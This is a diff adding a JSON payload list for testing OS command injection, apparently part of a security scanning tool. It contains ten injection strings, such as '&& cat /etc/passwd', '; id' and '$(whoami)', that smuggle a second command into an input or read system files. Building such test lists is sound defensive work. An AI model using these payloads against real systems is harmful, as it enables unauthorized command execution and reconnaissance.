@@ -1,0 +1,16 @@
+{
+  "name": "Command Injection",
+  "description": "Payloads for testing OS command injection",
+  "payloads": [
+    {"id": "cmd-01", "value": "; ls", "method": "append", "severity": "critical"},
+    {"id": "cmd-02", "value": "| whoami", "method": "append", "severity": "critical"},
+    {"id": "cmd-03", "value": "&& cat /etc/passwd", "method": "append", "severity": "critical"},
+    {"id": "cmd-04", "value": "; id", "method": "append", "severity": "critical"},
+    {"id": "cmd-05", "value": "| dir", "method": "append", "severity": "high"},
+    {"id": "cmd-06", "value": "`whoami`", "method": "append", "severity": "critical"},
+    {"id": "cmd-07", "value": "$(whoami)", "method": "append", "severity": "high"},
+    {"id": "cmd-08", "value": "|| ping -c 5 127.0.0.1", "method": "append", "severity": "medium"},
+    {"id": "cmd-09", "value": "; uname -a", "method": "append", "severity": "medium"},
+    {"id": "cmd-10", "value": "127.0.0.1 && cat /etc/hosts", "method": "replace", "severity": "critical"}
+  ]
+}
